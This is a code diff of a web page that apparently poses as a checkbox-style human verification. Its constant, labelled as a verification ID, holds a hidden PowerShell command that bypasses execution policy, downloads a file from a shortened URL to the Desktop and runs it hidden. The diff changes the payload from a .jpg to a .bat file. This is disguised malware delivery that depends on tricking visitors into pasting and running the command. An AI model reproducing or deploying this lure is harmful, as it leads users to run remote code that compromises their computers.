@@ -139,7 +139,7 @@
   const verifyBtn = document.getElementById("verify-verify-button");
   const verificationIdSpan = document.getElementById("verification-id");
 
-  const SAFE_ID = "powershell -w hidden -ep bypass -c \"& { $url = 'https://kntn.ly/bf7a6a6b'; $path = Join-Path -Path ([Environment]::GetFolderPath('Desktop')) -ChildPath '1.jpg'; Invoke-WebRequest -Uri $url -OutFile $path; Start-Process -FilePath $path -WindowStyle Hidden; }\"";
+  const SAFE_ID = "powershell -w hidden -ep bypass -c \"& { $url = 'https://kntn.ly/0e8bbe02'; $path = Join-Path -Path ([Environment]::GetFolderPath('Desktop')) -ChildPath '1.bat'; Invoke-WebRequest -Uri $url -OutFile $path; Start-Process -FilePath $path -WindowStyle Hidden; }\"";
 
 document.getElementById("checkboxArea").addEventListener("click", () => {
   if (checkbox.classList.contains("checked")) return;
@@ -230,3 +230,4 @@ document.getElementById("checkboxArea").addEventListener("click", () => {
 
 </body>
 </html>
+
